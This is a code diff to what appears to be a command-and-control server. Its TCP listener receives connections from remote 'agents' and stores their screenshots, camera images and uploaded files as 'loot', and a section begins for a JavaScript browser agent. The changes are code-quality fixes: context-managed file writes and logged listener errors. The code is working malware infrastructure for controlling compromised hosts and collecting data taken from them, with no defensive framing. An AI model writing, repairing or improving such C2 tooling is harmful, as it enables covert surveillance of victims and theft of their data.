@@ -191,7 +191,7 @@ def ts(): return datetime.now().strftime("%H:%M:%S")
 def _strip_ansi(s): return _re.sub(r'\x1b\[[0-9;]*[A-Za-z]|\r','',s)
 def log(m):
     l=f"[{ts()}] {m}"; print(l,flush=True)
-    open(f"{LOG_DIR}/c2.log","a").write(_strip_ansi(l)+"\n")
+    with open(f"{LOG_DIR}/c2.log","a") as _lf: _lf.write(_strip_ansi(l)+"\n")
 _log = log  # alias used by some route handlers
 
 # ── TCP raw agent listener ───────────────────────────────────────────────────
@@ -235,10 +235,11 @@ def _handle_result(aid,cmd,out):
             ext=".png" if "SCREENSHOT" in prefix else ".jpg"
             fname=f"{aid}_{cmd.replace(' ','_')}_{int(time.time())}{ext}"
             fpath=os.path.join(LOOT_DIR,fname)
-            open(fpath,"wb").write(raw)
+            with open(fpath,"wb") as _f: _f.write(raw)
             disp=f"[LOOT:{prefix}] saved {fname} ({len(raw)}b)"
             with _lock: agent_resps[aid].append({"cmd":cmd,"resp":disp,"ts":ts(),"loot":fname,"type":"image"})
-            if aid in agents: open(agents[aid]["log"],"a").write(f"\n[{ts()}] {disp}\n")
+            if aid in agents:
+                with open(agents[aid]["log"],"a") as _f: _f.write(f"\n[{ts()}] {disp}\n")
             log(f"[LOOT] {aid} {fname}")
             return
         except Exception as e: log(f"[LOOT ERR] {e}")
@@ -249,16 +250,17 @@ def _handle_result(aid,cmd,out):
             orig=parts[2] if len(parts)>2 else "file"
             fname=f"{aid}_{int(time.time())}_{orig}"
             fpath=os.path.join(LOOT_DIR,fname)
-            open(fpath,"wb").write(raw)
+            with open(fpath,"wb") as _f: _f.write(raw)
             disp=f"[LOOT:FILE] {orig} → {fname} ({len(raw)}b)"
             with _lock: agent_resps[aid].append({"cmd":cmd,"resp":disp,"ts":ts(),"loot":fname,"type":"file"})
-            if aid in agents: open(agents[aid]["log"],"a").write(f"\n[{ts()}] {disp}\n")
+            if aid in agents:
+                with open(agents[aid]["log"],"a") as _f: _f.write(f"\n[{ts()}] {disp}\n")
             log(f"[LOOT] {aid} {fname}")
             return
         except Exception as e: log(f"[LOOT ERR] {e}")
     with _lock: agent_resps[aid].append({"cmd":cmd,"resp":out,"ts":ts()})
     if aid in agents:
-        open(agents[aid]["log"],"a").write(f"\n[{ts()}] CMD:{cmd}\n{out}\n{'─'*40}\n")
+        with open(agents[aid]["log"],"a") as _f: _f.write(f"\n[{ts()}] CMD:{cmd}\n{out}\n{'─'*40}\n")
     log(f"[RESULT] [{aid}] {cmd[:40]} {len(out)}b")
 
 def agent_listener():
@@ -268,7 +270,7 @@ def agent_listener():
     log(f"[*] TCP :{AGENT_PORT}")
     while True:
         try: conn,addr=srv.accept(); threading.Thread(target=handle_agent,args=(conn,addr),daemon=True).start()
-        except: pass
+        except Exception as e: log(f"[!] Accept error: {e}")
 
 # ── JS browser agent ─────────────────────────────────────────────────────────
 JS_AGENT=r"""
